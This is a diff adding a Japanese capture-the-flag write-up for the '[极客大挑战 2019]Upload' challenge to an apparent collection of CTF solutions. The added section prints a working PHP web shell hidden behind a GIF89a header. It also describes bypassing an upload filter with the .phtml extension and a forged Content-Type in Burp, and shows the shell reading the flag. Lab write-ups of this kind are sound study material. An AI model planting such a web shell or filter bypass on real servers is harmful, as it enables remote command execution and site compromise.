@@ -21,6 +21,7 @@
 - [[极客大挑战 2019]Http](#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019http)
 - [[SUCTF 2019]CheckIn](#suctf-2019checkin)
 - [[极客大挑战 2019]BabySQL](#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019babysql)
+- [[极客大挑战 2019]Upload](#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019upload)
 
 <!-- END doctoc generated TOC please keep comment here to allow auto update -->
 
@@ -901,4 +902,34 @@ FlagというテーブルがあったのでtableがFlagでcolumがflagかと思�
 ```
 ```html
 <p style='font-family:arial;color:#ffffff;font-size:30px;left:650px;position:absolute;'>Your password is 'i_want_to_play_2077,sql_injection_is_so_fun,do_you_know_pornhub,github_is_different_from_pornhub,you_found_flag_so_stop,i_told_you_to_stop,hack_by_cl4y,flag{15b7f2e9-53e8-43d8-9f20-74cdf3ac119a}'</p>
+```
+
+# [极客大挑战 2019]Upload
+
+```<?```
+がフィルターされてるので他の代替を考える。
+
+```
+GIF89a
+<script language="php">system($_GET['cmd']);</script>
+```
+
+拡張子が.phpはフィルターされてるのでほかの代替を考える。
+```
+NOT！php! 
+```
+
+wikipediaをみてみると
+```
+Filename extensions	.php, .phtml, .php3, .php4, .php5, .php7, .phps, .php-s, .pht, .phar
+```
+があるようです
+拡張子をphtmlにすることで上記のphpを実行させる。
+しかし、画像ファイルじゃないとアップロードできない。
+拡張子でチェックしているわけではなくContent-typeをみているのでburpでContent-typeをimage/jpegに変更してforwardする。
+
+
+## shell.phtml?cmd=cat%20/flag
+```
+GIF89a flag{4ae465ec-f085-4c73-aeab-cd678b3ed2f6} flag{4ae465ec-f085-4c73-aeab-cd678b3ed2f6}
 ```
